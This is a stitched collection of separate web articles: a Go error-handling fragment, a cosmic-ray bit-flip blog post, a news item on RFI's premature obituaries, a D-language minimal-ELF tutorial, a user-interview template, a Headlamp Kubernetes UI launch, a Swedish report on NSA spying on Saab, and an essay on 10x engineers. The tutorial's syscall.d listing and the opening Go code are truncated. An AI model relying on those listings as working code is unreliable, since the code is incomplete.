<div data-language="go"><pre><code><span>func</span> <span>process</span><span>(</span>ctx context<span>.</span>Context<span>,</span> workCh <span>chan</span> WorkItem<span>,</span> resCh <span>chan</span> WorkItemResult<span>)</span> <span>error</span> <span>{</span>

<p>This code handles all the issues enumerated above, and it also allows the results to be handled concurrently with the
processing.  In the cases where you are doing something expensive with each result this could provide a performance
improvement.</p>

<p>There seems to be only one reason to use panics for flow control. Littering your code with explicit error checking after
every function call is tedious and ugly.  You are right, but the beauty of your code, won't improve your product. Go
forces explicit error handling that results in programs that do the appropriate things when error conditions are encountered.
It may be ugly, but I hope my pain and suffering serve as yet another reason not to use panics instead of returning errors.</p></div></div>]]>

<p><span>Published on 2019-09-01 by <a href="https://alexbakker.me/">Alexander Bakker</a></span></p><article><p>I think I experienced a random bit flip while updating Linux on one of my
machines today. My laptop was humming along happily during compilation until GCC
suddenly aborted with an error: <strong><em>invalid preprocessing directive #lefine; did
you mean #define?</em></strong>.</p>

<p><img src="https://alexbakker.me/img/random-bit-flip.png" alt=""></p>

<p>Huh, <code>#lefine</code> instead of <code>#define</code>?</p>

<p>Now, GCC is known for its cryptic error messages, but this one left me baffled.
Things I tried to figure out what the issue could be:</p>

<ul>
<li>I first grepped the offending file, <code>drivers/gpu/drm/i915/i915_reg.h</code>, for
<code>#lefine</code> to see if a typo somehow slipped through the Linux 4.19.1 release,
but got 0 matches.</li>
<li>When I resumed the build, it completed without errors. The kernel also
appeared to run fine upon reboot. I ended up recompiling it entirely multiple
times to see if I could reproduce the error, but I couldn’t.</li>
<li>I ran a MemTest86 test for 24 hours, but it didn’t find any errors, so the RAM
is also unlikely to be the culprit.</li>
</ul>

<p>I thought I was losing my mind until it dawned on me that this could have been
caused by cosmic rays. Looking at ASCII table, we see that ’d’ and ‘l’ are
indeed one bit flip away from each other:</p>

<table>
<thead>
<tr>
<th>char</th>
<th>decimal</th>
<th>binary</th>
</tr>
</thead>

<tbody>
<tr>
<td>d</td>
<td>100</td>
<td>1100100</td>
</tr>

<tr>
<td>l</td>
<td>108</td>
<td>1101100</td>
</tr>
</tbody>
</table>
<p>Could that be it? Isn’t that incredibly unlikely? There doesn’t appear to be a
consensus in existing literature <sup id="fnref:1"><a href="#fn:1">1</a></sup> <sup id="fnref:2"><a href="#fn:2">2</a></sup> <sup id="fnref:3"><a href="#fn:3">3</a></sup> on how often these errors
actually occur, but I did learn that this phenomenon is actually more common
than I thought. The chances of flipping a bit that would cause software to break
in this fashion, on the other hand, must be incredibly small.</p>

<p>In the end, there’s just no way to prove that this was actually caused by cosmic
rays. It could also have been some other extremely rare hardware fluke. Either
way, this took me by surprise, to say the least.</p>

<p>Perhaps this is the cosmos’ way of telling me to invest in ECC RAM.</p>

<p>France's RFI public radio has apologised for mistakenly publishing obituaries for a number of celebrities still very much alive, including Britain's Queen Elizabeth and Brazilian football legend Pele.</p>
<p>Citing a "technical problem" that caused the death notices to be released on its website today, the broadcaster said: "We offer our apologies to the people concerned and to you who follow and trust us.</p>
<p>"We are mobilising to rectify this major bug," said the Twitter account of RFI, which saw itself the target of much online derision for the error.</p>
<p>Others RFI declared dead included Iran's supreme leader Ayatollah Ali Khamenei, former US President Jimmy Carter, Cuban leader Raul Castro, actors Clint Eastwood, Sophia Loren and Brigitte Bardot.</p>
<p>French business mogul Bernard Tapie, 77, whose obituary had been prematurely published by other news outlets at least twice before, was also on the RFI list.</p><blockquote>
<p>🔴 Un problème technique a entraîné la publication de nombreuses nécrologies sur notre site.<br>
Nous sommes mobilisés pour rectifier ce bug majeur et présentons nos excuses aux personnes concernées ainsi qu'à vous qui nous suivez et nous faites confiance.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-776">

    

	<div>

		
<p>In the spirit of “<a rel="noreferrer noopener" href="https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html" target="_blank">A Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a>,”  we are going to try to create a minimal 64 bit ELF executable using just standard D and some inline assembly code.</p>



<p>We are going to focus on creating the standard hello world executable popularized by Brian Kernighan. </p>



<p>In the standard D language, using the phobos library (the now only real standard library for D, previously there existed two competing standard libraries), we would write this as:</p>


<pre title="">import std.stdio;

int main(){
    write("Hello\n");
    return 0;
}
</pre>


<p>Compiling this:</p>



<pre><code>dmd basic_hello.d </code></pre>



<p>yields a 1.9M executable.</p>



<pre><code>wc -c ./basic_hello
 1895528 ./basic_hello</code></pre>



<p>Using gdc brings it down to 28k. Note: gdc like gcc defaults to naming the executable ‘a.out’, whereas dmd names it after the file or module.</p>



<pre><code>gdc basic_hello.d 
wc -c ./a.out
 28608 ./a.out</code></pre>



<p>So we get some improvement.  The biggest issue is that it is dynamically linking in a bunch of code we don’t need, including a bunch of machinery for exceptions we won’t throw, and code to handle cases we don’t need.  Really we just need to put a string to standard out, which is exactly what the C function puts is for.</p>


<pre title="">import core.stdc.stdio;

int main(){
    puts("Hello");
    return 0;
}
</pre>


<p>Compiling this with gdc give us a small decrease in size.</p>



<pre><code>gdc basic_hello.d 
wc -c ./a.out
 21296 ./a.out</code></pre>



<p>Running ldd on it we can see we still pull in the D runtime even though we don’t need it.</p>



<p>&gt; ldd ./a.out<br>linux-vdso.so.1 (0x00007ffd02db8000)<br>libgphobos.so.1 =&gt; /lib64/libgphobos.so.1 (0x00007f4b1caa8000)<br>libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f4b1ca8d000)<br>libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f4b1c947000)<br>libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f4b1c925000)<br>libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f4b1c91e000)<br>libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f4b1c753000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f4b1d09f000)</p>



<p>This is exactly what betterC mode is for! Let’s try it. We just need to modify our main function to be ‘extern(C)’.</p>


<pre title="">import core.stdc.stdio;
extern(C):
int main(){
    puts("Hello");
    return 0;
}
</pre>


<p>With gdc, betterC mode is called with the flag ‘no-druntime’.</p>



<pre><code>gdc -fno-druntime basic_hello.d 
wc -c ./a.out
 20600 ./a.out</code></pre>



<p>So that is pretty good and we are down to just 20k. And we are only linking against the standard C library.</p>



<p>&gt;ldd ./a.out<br>linux-vdso.so.1 (0x00007ffd119c7000)<br>libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f447f734000)<br>libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f447f569000)<br>/lib64/ld-linux-x86-64.so.2 (0x00007f447f783000)</p>



<p>We can run strip on it to save some space:</p>



<pre><code>strip -s ./a.out
wc -c ./a.out
 15016 ./a.out</code></pre>



<p>Now we are running into the limits of what we can do with linking to the C standard library without switching to musl.  And even there we are getting away from programming in D and instead just messing with optimizing C code, which is not the point of this article.</p>



<p>So how does the C standard library print a string to standard output?  In the end it performs a system call.  In modern Windows Microsoft makes it unreasonably hard to do this by changing the syscall numbers on every update.  This might stop some viruses that hardcode system calls, but makes it impossible to do any Windows programming without using the C standard library/Win32 API. So in this article we will focus on Linux in particular since the system call interface is explicitly blessed by the kernel developers.  FreeBSD and other Unices tend to prefer the usage of the C standard library API.  Here we will also just worry about the x86_64 architecture(being 2020, the only other architecture in major use that is widely supported by D compilers is AARCH64).</p>



<p>The system call interface for Linux is specified in the System V ABI document <a rel="noreferrer noopener" href="https://www.uclibc.org/docs/psABI-x86_64.pdf" target="_blank">here</a>. In short, you just pass the syscall number in the RAX register, and the other arguments in rdi, rsi, rdx, etc.</p>



<p>The 3 main D language compilers, DMD, GDC, and LDC, all have slightly different ways you can include assembly code inline.  Just for fun I wrote a version for each using their features.  One thing I noticed is when using the LDC version of inline assembly it mentions needing a comma separated list for the constraints. I included some spaces in the list and received an invalid asm constraint error that was ridiculously tricky to track down.</p>



<p>One other thing to note is that the main function we have been using so far is based on the fact that in the end we link to the standard C library which also has a main function that is called from another entry point, by not using the standard C library and the start files from it (which basically help the C language runtime set up some scaffolding it needs for ‘atexit’ and such (side side note, the C language does have a runtime, you just usually don’t notice it)) we no longer have an entry point.  Most things assume the entry point is called ‘_start’, but this can be overridden in the linker. </p>



<p>Let’s write our syscall routines in a file called syscall.d:</p>


<pre title="">module syscall;

    }



}

</pre>


<pre><code>And our _start entry point and some helper functions in hello.d:</code></pre>


<pre title="">import syscall;

immutable long SYS_WRITE = 1;
immutable long SYS_EXIT = 60;

extern (C):
@nogc:
nothrow:
pragma(inline, true):
size_t write(int fd, in char* buf, size_t count)
{
    return syscall3(SYS_WRITE, fd, cast(long) buf, count);
}

extern (C):

pragma(inline, true):
void exit(long exit_code){
     syscall1(SYS_EXIT, exit_code);
}

extern (C):
@nogc:
nothrow:
void _start()
{
    write(1, "Hello\n", 6);
    exit(0);
}
</pre>


<p>We also need to link this file ourselves so that we don’t pull in any libc dependencies, we do this by using the ‘ld’ command and by just compiling and not linking (the ‘-c’ flag).</p>



<pre><code>gdc -fno-druntime -nodefaultlibs hello.d syscall.d -c 
ld ./hello.o
ldd ./a.out
         not a dynamic executable</code></pre>



<p>Cool so we now have a statically linked executable that has no dependence on the standard C library! How much did we save?</p>



<pre><code>wc -c ./a.out
 13672 ./a.out</code></pre>



<p>Ugh all that work and only 2k extra savings!  Lets see what is in the executable. We can get this by running ‘readelf -a’ on the executable. Our executable has 9 sections.</p>



<pre><code>[0]
[1] .text
[2] .rodata
[3] .eh_frame
[4] .data
[5] .comment
[6] .symtab
[7] .strtab
[8] .shstrtab</code></pre>



<p>The first that sticks out is the ‘.eh_frame’ section.  That is used for exception unwinding, stack cleanup and other assorted things we don’t need.  We can tell gdc that we don’t want those by adding two flags:</p>



<pre><code>&gt;gdc -fno-druntime -nodefaultlibs  -fno-exceptions -fno-asynchronous-unwind-tables  hello.d syscall.d -c 
&gt;ld ./hello.o
&gt;wc -c ./a.out
 9488 ./a.out</code></pre>



<p>Awesome we just saved 4k, but there is still fat to trim.  One thing we can learn from reading the info pages for ‘ld’ is that there is a flag to help pack executables if you don’t need shared libraries, ‘-n’. Using this saves us about 3k:</p>



<pre><code>&gt;gdc -fno-druntime -nodefaultlibs  -fno-exceptions -fno-asynchronous-unwind-tables  hello.d syscall.d -c 
&gt;ld -n ./hello.o
&gt;wc -c ./a.out
 6112 ./a.out</code></pre>



<p>If we look at the executable with readelf again we can see that the compiler outputs symbols for a lot of things we don’t need:</p>



<p>Symbol table ‘.symtab’ contains 21 entries:<br>Num: Value Size Type Bind Vis Ndx Name<br>0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND<br>1: 00000000004000b0 0 SECTION LOCAL DEFAULT 1<br>2: 00000000004002cf 0 SECTION LOCAL DEFAULT 2<br>3: 00000000004012d8 0 SECTION LOCAL DEFAULT 3<br>4: 0000000000000000 0 SECTION LOCAL DEFAULT 4<br>5: 0000000000000000 0 FILE LOCAL DEFAULT ABS test.d<br>6: 0000000000400187 32 FUNC GLOBAL DEFAULT 1 syscall0<br>7: 00000000004012e0 8 OBJECT GLOBAL DEFAULT 3 _D4test8SYS_EXITyl<br>8: 000000000040021d 83 FUNC GLOBAL DEFAULT 1 syscall5<br>9: 00000000004012d8 8 OBJECT GLOBAL DEFAULT 3 _D4test9SYS_WRITEyl<br>10: 00000000004001a7 51 FUNC GLOBAL DEFAULT 1 syscall2<br>11: 00000000004000b0 47 FUNC GLOBAL DEFAULT 1 write<br>12: 0000000000400162 37 FUNC GLOBAL DEFAULT 1 _start<br>13: 00000000004012e8 0 NOTYPE GLOBAL DEFAULT 3 __bss_start<br>14: 00000000004001da 67 FUNC GLOBAL DEFAULT 1 syscall4<br>15: 0000000000400137 43 FUNC GLOBAL DEFAULT 1 syscall1<br>16: 00000000004012e8 0 NOTYPE GLOBAL DEFAULT 3 _edata<br>17: …</p></div></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Use this template to ask the user interview questions that drive product and marketing decisions. </p><div><div><p><strong>Who this is for:</strong> Founders, product managers, and UX researchers conducting user research to guide the development of new or improved products.</p>
<p><strong>Why this exists:</strong> Too frequently I see founders and product managers start with a solution and then ask for feedback on it (UX researchers tend to get this right). This doesn’t work. As one user interviewee told me recently, “When I first conducted user interviews all I learned was that everyone loves your product if you ask stupid questions”. </p>
<h2>Template</h2>
<p>Download the template I start with when creating questions for a new set of user interviews.</p>
<p><a href="https://assets.ctfassets.net/t15p0nh3y83f/CeL5x9np6vyuBk73RwAV3/afb00c3a7580ec049bd72011a9bcbf19/user_interview_template.xlsx">User interview template</a></p>
<h2>Filled-Out Example</h2>
<p><a href="https://assets.ctfassets.net/t15p0nh3y83f/20Z7GcDwGyHeUK8D1ZQafZ/892c2c0baaa8e7d591788a0f198931cf/example_user_interview_notes.xlsx">Download this example to see what my notes look like for a typical user interview.</a></p>
<h2>How I Use The Template For User Interviews</h2>
<p>Here’s how I break up a 30-minute user interview:</p>
<p><strong>1. Background and rapport-building [5 minutes]</strong></p>
<p>A successful qualitative user interview should be sincere, vivid, and emotional. To achieve all three of these you need to build a solid foundation with your interviewee. When I'm on the other end of user interviews, I can always tell how experienced the interviewer is by how much they ask about me at the beginning. Experts spend more time getting to know me. We do this to build rapport and understand more about the segment we’re interviewing. For example, in my research, I’ve found that the role of a product manager varies so much between a large and small firms that they’re two completely different segments. Another thing I try to do is earn confidence from the interviewee by proving that I’m well prepared. For example, if I see that the user recently switched roles, or we have a shared connection or interest, I’ll sneak that into this portion.</p>
<p>Don’t ask: Nothing. Don't skip this part. You’re about walk the tightrope between interrogation and interview; if you don’t build rapport early on, you’ll plummet into interrogation territory.</p>
<p>Do ask: Can you tell me a little about your role as a Product Manager at Acme Group?</p>
<p><strong>2. Detailed story-collecting questions [20 minutes] </strong></p>
<p>A successful user interview is one where you, as the interviewer, walk away with a collection of vivid stories. As humans, we don’t recognize issues until we talk about specific scenarios and we tend to be terrible at predicting how we will respond to future scenarios. The key to parseing these out is the follow-up questions you ask. One rule of thumb I use is the rule of five whys; try following up a user’s response with “why” until you’ve reached the core of a problem. </p>
<p>Don’t ask: What problems do you encounter when you do x?</p>
<p>Do ask: Tell me about the last time you did x.</p>
<p><strong>3. Product questions [3 minutes]</strong></p>
<p>Once I’ve collected some stories, if I have time, I’ll spend a few minutes describing the hypothesized product and asking questions about it. One of the best things you can do here is to parse out the expectations from the customer; that’s where the gold is. For example, I’ll give a somewhat vague description of the product, and the customer will say, “so does the thing do y”? Which is the perfect time to ask, “would you like it to do y? Why?” Another great question is, “what did you expect?” For example, a user sent me the following email the other day, “I signed up but I’m not quite sure if I was doing it correctly?” My response: “May I ask a question? What did you expect to see that you didn’t?” Turns out, the user expected to see a note that they would get notified when they got a match. During this portion, I'll usually ask questions on a one to ten scale because it forces the customer to examine why they gave a certain rating to something and parses out their hesitations to use the product. </p>
<p>Don’t ask: The product does x, would you use it?</p>
<p>Do ask: On a scale of 1 (not likely at all) to 10 (very likely) how likely would you be to use the product? Why? On a scale of 1 (not likely at all) to 10 (very likely), how likely would you be to use the product if it did x? Why?</p>
<p><strong>4. Flywheel-building questions [2 minutes]</strong></p>
<p>By now you’ve built rapport, have some user stories, and the user has a sense of what you’re working on. My favorite questions to ask here are: is there anything I haven’t asked that you think I should be asking? And: do you have any other concerns that we haven’t already talked about? On average, two out of eight respondents will have a question here; when they do it is usually gold because it uncovers something huge that I’ve neglected. Finally, I ask if there’s anyone else that I should be interviewing. This question helps open our blinders to new segments and sometimes leads to a referral for the next user interview.</p>
<p>Don’t ask: Anything else?</p>
<p>Do ask: Is there anything I haven’t asked that I should be asking? Do you have any concerns that haven’t been brought up yet? Is there anyone else that you think I should be interviewing for this research?</p>
<p>For more information on this topic, I discuss how to conduct a user interview in the blog post, <a href="https://www.userinterviewexchange.com/blog/how-to-conduct-qualitative-user-interviews">How To Conduct Qualitative User Interviews For Customer Discovery</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>If you’ve ever seen a Kubernetes demo, it probably involved a terminal and someone typing commands using kubectl and arcane yaml configuration files. This might be a powerful workflow for experts, but in an age when everything has a slick web interface, it is not the most accessible user experience. It <strong>steepens the learning curve</strong> for those new to Kubernetes, and <strong>presents a barrier</strong> to occasional users.</p>
<p>Of course, there are several graphical user interfaces available for Kubernetes, including the <em>Kubernetes Dashboard</em> project that is part of upstream Kubernetes itself. However, when we researched the landscape, we couldn’t find a solution that covered everything we were looking for. Specifically, our criteria were:</p>
<ul>
<li>100% open source</li>
<li>Actively maintained</li>
<li>Generic, in the sense of not being tied to a specific vendor’s Kubernetes distro</li>
<li>Modular and extensible</li>
<li>Clean, modern user interface</li>
<li>Implemented using a stack that was familiar to our development team (Go, Javascript/Typescript, React)</li>
<li>An interactive UI that allows read-write operations, not just a read-only dashboard</li>
<li>Multi-cluster.</li>
</ul>
<p>Despite the good number of alternatives, the reality is that none of the solutions we tested at the time really matched all the points in our criteria or was a good base to start from. So, in the time-honored tradition, we decided to build one ourselves…</p>

<p>Today, I am <strong>proud to announce the general availability of a new UI for Kubernetes</strong>: 


<a href="https://github.com/kinvolk/headlamp" target="_blank">Headlamp</a>
.</p>
<p><img src="https://kinvolk.io/media/headlamp_cluster_overview.png" alt="Headlamp"></p>
<p>Headlamp is a generic and extensible Kubernetes UI that meets the criteria mentioned above. Of course, coming from Kinvolk, it is 100% open source. We hope many Kubernetes community members will not just enjoy using Headlamp, but also contribute back to the project.</p>
<p>Let’s take a quick spin through some of its core features.</p>
<h2 id="extensible-ui">Extensible UI</h2>
<p>We want Headlamp to be used for as many different use-cases as possible. That includes not only novice Kubernetes users, but also experienced operators, as well as Kubernetes vendors with very different needs. Often, particularly for UI projects, such a breadth of use cases can only be addressed by downstream users maintaining their own fork. But keeping forks up to date becomes more challenging the deeper the changes are.</p>
<p>A solution to this problem is to have a plugin system. So Headlamp supports out-of-tree UI plugins: Javascript files that are loaded by Headlamp’s backend and passed to the client which dynamically loads them.</p>
<p>This opens up Headlamp to innovation, <strong>fostering a wealth of new functionality</strong>. For example, if you want to add a button to the Pod details view that will redirect the user to a service showing how much the Pod is costing to operate, that should be easy to implement.</p>
<p>We see Headlamp’s plug-in capabilities as a great opportunity for the community. We are eager to collaborate with others who want to develop new Headlamp plugins, or enhance the plugin system itself to support other use-cases.</p>
<h3 id="traceloop">Traceloop</h3>
<p>As an <strong>example of the power of the plug-in system</strong>, and an incredibly useful tool in its own right, we have developed a 


<a href="https://github.com/kinvolk/lokomotive-web-ui/tree/master/plugins/ig-traces" target="_blank">Headlamp plugin for the traceloop gadget</a>
 of our 


<a href="https://github.com/kinvolk/inspektor-gadget" target="_blank">Inspektor Gadget</a>
 project.</p>
<p>When Inspektor Gadget is installed in a cluster and the traceloop gadget is enabled, it <strong>records all syscalls from a pod</strong> into a ring buffer. This buffer can be seen in real-time as the pod is running, allowing a lens into what the pod is doing right now, but is also saved for terminated pods. This allows operators to see what caused a crash, after it happens – like a “flight data recorder” for your Kubernetes apps.</p>
<p><img src="https://kinvolk.io/media/traces.gif" alt="Traces plugin for Headlamp"></p>
<h2 id="role-aware-ui">Role-aware UI</h2>
<p>One problem with many read-write (CRUD) user interfaces is that they are not aware of underlying access controls. For example, displaying the update/delete buttons is misleading if the user has actually no permissions to modify the resource. So Headlamp checks Kubernetes RBAC settings and displays only those controls whose actions can be performed. So, if the user does not have permission to edit a resource, the edit button will not be displayed.</p>
<p>This results in a much better UX, because it is obvious to the operator what actions are available based on their permissions at the time. In particular, this is great for situations where time-limited credentials are granted to operators (e.g. temporary deletion permissions on a resource).</p>
<p><img src="https://kinvolk.io/media/headlamp_permissions.png" alt="Pod when the user has update/delete permissions" title="Pod when the user has update/delete permissions">
<sub>Pod when the user has update/delete permissions</sub></p>
<p><img src="https://kinvolk.io/media/headlamp_no_permissions.png" alt="Pod when the user has no update/delete permissions" title="Pod when the user has no update/delete permissions">
<sub>Pod when the user has no update/delete permissions</sub></p>
<h2 id="design--user-interface">Design / User Interface</h2>
<p>We wanted Headlamp’s design to be as <strong>clean and modern</strong> as possible, yet without breaking with a more “traditional” Kubernetes UI or dashboard style. For example, we think that showing a familiar table-based view is very helpful, and we hope other visualizations, such as a graph-based representation of the cluster, can be implemented through plugins.</p>
<p>To implement Headlamp’s frontend, we chose to use React with the 


<a href="https://material-ui.com/" target="_blank">Material UI</a>
 library, because it is modern, clean, and is well maintained with a large user community. It also has the advantage that it is the same technology stack that we use in our 


<a href="https://github.com/kinvolk/nebraska" target="_blank">Nebraska</a>
 project, enabling sharing of expertise and resources, and supporting a consistent UI across all our products.</p>
<h2 id="desktop-vs-in-cluster">Desktop vs In-cluster</h2>
<p>Most Kubernetes UIs can be categorized as either a hosted (often in-cluster) backend, such as the original Kubernetes Dashboard, or a local desktop application, such as VMware’s 


<a href="https://github.com/vmware-tanzu/octant" target="_blank">Octant</a>
 project.</p>
<p>Both approaches have their advantages and disadvantages. For example, when run as a hosted application, it’s very simple to just share a URL with users, and have them log in through OIDC. It’s available “everywhere”, and it’s easy to keep it up-to-date with the cluster version. Conversely, with a desktop application, there’s no need to host the UI application, keeping things more isolated, but the burden of keeping the app up to date falls on the user.</p>
<p>With Headlamp, you <strong>don’t have to choose</strong> between these two approaches, as we support both. It can be easily <strong>hosted in-cluster</strong> by using/adapting the YAML files we provide, or <strong>installed locally</strong> on Linux, Mac, and Windows.</p>
<h2 id="multi-cluster-support">Multi-cluster support</h2>
<p>Most Kubernetes deployments involve multiple clusters, even if that’s just to separate a development from a production environment. Thus, Headlamp <strong>allows you to access all your clusters</strong> - with the exact method depending on whether you’re running as a hosted, or a local (desktop), application.</p>
<p>When run locally, Headlamp will read the kube config and display the contexts available there, allowing the user to change when needed just by setting the local environment variable to the appropriate cluster.</p>
<p>The way the multi-cluster support works is straightforward: it creates a proxy for each configured cluster, and redirects requests from the UI (with the Kubernetes API calls) to the right cluster address. Shout-out here to the 


<a href="https://github.com/indeedeng/k8dash" target="_blank">K8dash</a>
 project, whose request/API management modules we reused in the development of Headlamp.</p>
<p>It’s also possible to mix this with running in-cluster, though this does require the cluster running the application to have API access to the other configured clusters.</p>
<p><img src="https://kinvolk.io/media/headlamp_cluster_chooser.png" alt="Cluster Chooser" title="Cluster chooser dialog"></p>

<p>You may be aware that Kinvolk also has a Kubernetes distribution, 


<a href="https://kinvolk.io/lokomotive" target="_blank">Lokomotive</a>
. While Headlamp is of course used within Lokomotive as the basis for its web user interface, it is important to note that these are separate and independent projects. True to our goal of being independent of any particular distro, <strong>Headlamp is designed to support any conformant Kubernetes cluster</strong>.</p>

<p>It’s <strong>easy to try out Headlamp</strong>: just apply the deployment manifest to your cluster and point your browser to the Headlamp service, or download and install the desktop application for Windows, Mac, or Linux. For details, see the 


<a href="https://kinvolk.io/docs/headlamp/latest/installation" target="_blank">documentation</a>
.</p>
<p>Headlamp is fully open source, released under the Apache 2.0 terms and, as mentioned above, we created it to be a generic and vendor-independent Kubernetes UI that we hope can suit many use-cases. So we encourage anyone interested to take part.</p>
<p>If you want to participate, please check out our

<p><strong>We hope you enjoy Headlamp!</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Bland målen för amerikanska NSA:s avlyssning fanns Saab och den danska försvarskoncernen Terma. Enligt uppgifter till DR, från flera av varandra oberoende källor med insyn i granskningen av den pågående avlyssningsskandalen i Danmark, har NSA fått tillgång till fiberoptiska kablar och ett datacenter på Amager söder om Köpenhamn. Därifrån har man avlyssnat holländsk, norsk, fransk och tysk datatrafik, danska politiska institutioner och svenska försvarsintressen.</p><p>Flera källor pekar ut det svenska Gripen-programmet som ett av målen.</p><h4>Danmark upphandlade nya stridsflyg</h4><p>Det amerikanska spionaget ska, enligt Danmarks radios källor, ha skett samtidigt som den danska staten upphandlade nya stridsflygplan – där Saabs Gripen-plan var med i slutstriden. Danska staten köpte till sist 27 amerikanska F-35-stridsflygplan.</p><p>Danmarks radio har vare sig kunnat styrka eller avfärda att avlyssningen hade ett samband med mångmiljardaffären, detsamma gäller frågan huruvida någon känslig information har röjts. Men enligt experter som SVT och DR talat med kan det röra sig om ekonomiska motiv.</p><h4>Visselblåsare slog larm</h4><p>Den danska skandalen inleddes med att en anställd på FE upptäckte att NSA bedrev olagligt spioneri genom det dansk-amerikanska underrättelsesamarbetet. Efter flera misslyckade försök att uppmärksamma FE:s ledning på problematiken larmade visselblåsaren FE:s tillsynsmyndighet TET.</p><p><span>Myndigheten inledde en undersökning som resulterade i en fyra pärmar tjock rapport. </span><br><span>Materialet från visselblåsaren indikerar, enligt tillsynsmyndigheten TET:s pressmeddelande, att FE:s ledning ”underlåtit att följa upp eller närmare undersöka indikationer på spionage”. Den danska försvarsministern Trine Bramsen tvingade fem personer i FE:s ledning att lämna sina uppdrag.</span></p><h4>Sofistikerad programvara</h4><p>NSA hade fått tillgång till internationella fiberkablar som löper in och ut ur Danmark till bland annat Sverige, USA, England och Tyskland. Kablarna är nyckel i den storskaliga avlyssning som USA och deras allierade bedriver.</p><p>Enligt Danmarks radio har NSA på danska Amager under perioden 2012-2014 upprättat ett datacenter som använder systemet XKeyscore, avslöjat 2013 av Edward Snowden, en central funktion i hela NSA:s avlyssningsapparat. Programmet gör det möjligt att gå igenom stora datamängder i fiberkablar med hjälp av ”selektorer” – sökord som namn på personer i central ställning i intressanta organisationer.</p><p>Enligt källorna fanns selektorer direkt riktade mot Gripenprogrammet och andra försvarsindustriella objekt.</p><p>SVT har i flera omgångar varit i kontakt med Saab som vid ett första möte menade att spionaget inte var anmärkningsvärt och var då beredda att ställa upp på en intervju.

Programmet avslöjades för första gången i samband med Edward Snowden-affären och beskrivs som ett av världens mest sofistikerade övervakningssystem.</p><p>Genom en mycket omfattande datainsamling via bland annat kabelnätverk ger det NSA och deras partners möjlighet att övervaka och söka i information rörandes miljontals människor över hela världen.</p><p>Visselblåsaren Edward Snowden har själv arbetat med XKeyscore. I ett uttalande till The Guardian beskrev han programvaran så här:</p><p>”Jag, sittande vid mitt skrivbord kan avlyssna vem som helst, du eller din revisor, en domare eller till och med presidenten, bara jag har en personlig e-post”.</p><p>NSA:s egen hemliga träningsmanual beskriver hur operatörerna kan få tillgång till NSA:s enorma datalager och söka i vad NSA själva kallar det mest vittomspännande datatrålande system man har tillgång till.

I materialet framgick att FRA liksom FE samarbetar med NSA som har personal och utrustning på plats även i Stockholm, bland annat Xkeyscore. Avslöjandet beskrev också hur NSA och FRA samarbetade med den kombination av spaning som utgör systemets storhet: Xkeyscore kartlade användares nättrafik, bland tekniker på belgiska teleoperatören Belgacom, och med hjälp av trojan-systemet Quantum inserts, där FRA var en viktig partner, sköt in trojaner för att få kontroll över Belgacoms system. Ett system som bland annat betjänar EU-kommissionen.</p><p><em><a href="https://www.svtplay.se/video/29111154/nyheter-direkt/stort-forsvarsavslojande?start=auto">Här kan du se hela direktsändningen på SVT Play. </a></em></p></div></section><section><a href="https://www.svt.se/nyheter/inrikes/kallor-till-dr-usa-bedrev-spionage-mot-saab-med-hjalp-av-danska-underattelsetjansten" role="button"></a><div><p>Vet du mer?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Growing up, the only thing that put me off while learning software development, was the common occurrence of people who cared more about one upping others with their trivia knowledge rather than actually building things.</p>
<p>At the start of my career I had a difficult time differentiating between them and actual top performers because the industry still thought there was a strong correlation between jerks and highly productive people. Employers used to be afraid something will go wrong if they fired a mythical 10x engineer and no one else understood how to fix their systems.</p>
<p>After 15 years what I've learned is that engineers that produce orders of magnitude more than others exist<sup id="fnref-1"><a href="#fn-1">1</a></sup>, but the way they are talked about is overly exaggerated. They’re usually not jerks either, at least not more than the rest of the population.</p>
<p>If you find a project where only one person know what is going on, chances are that person is not good at writing code for humans, not that is a coding god.</p>
<p>One thing we don’t often consider is that you don’t have to hire the very top of the field to find people that are orders better than the industry average. Even more important than finding great engineers is to avoid bad ones<sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Being obsessed with finding a 10x engineer, is to be obsessed with shortcuts and Hail Marys. It will hurt you in the long run if you’re focusing on that instead of building solid fundamentals.</p>
<p>Ultimately I am convinced that focusing on building teams is more important than finding individual outliers. Of course the John Carmacks, the Jeff Deans, the Fabrice Bellards, of the industry exist, but your startup isn’t going to die if you don’t find one. It will die if you don’t build a good team.</p>
<h2>Good reads on individual and team performance</h2>
<ul>
<li>Steve McConnell, has a great summary of existing studies that support the 10x theory in <a href="https://www.construx.com/blog/productivity-variations-among-software-developers-and-teams-the-origin-of-10x/">“Individual Productivity Variation in Software Development”</a>. </li>
<li>McConnell also recognizes the aforementioned studies are not perfect in <a href="https://www.construx.com/blog/the-origins-of-10x-how-valid-is-the-underlying-research/">“Origins of 10X – How Valid is the Underlying Research?”</a>. But the lack of studies contradicting the current findings and the abundance of anecdotal stories signals towards confirmation.</li>
<li>In <a href="https://doi.org/10.1080/10429247.2002.11415178">“Leadership, Team Building, and Team Member Characteristics in High Performance Project Teams”</a> the authors identify 9 themes<sup id="fnref-3"><a href="#fn-3">3</a></sup> as potential predictors of team performance.</li>
<li>In <a href="https://doi.org/10.1080/10429247.2002.11415147">“Linking Project Team Performance with Team Health”</a> the authors emphasize that team building is a long term strategy that does not happen overnight by itself. Organizations must invest if they want to build healthy, high performing teams.</li>
<li>In <a href="https://doi.org/10.1080/10429247.1999.11415013">“An Empirical Study of the Relationship Between Team Performance and Team Maturity”</a> the authors measure the impact of changes in team dynamics, and make a correlation of team maturity with high performance teams. They mention how persistance is required to move to higher performance.</li>
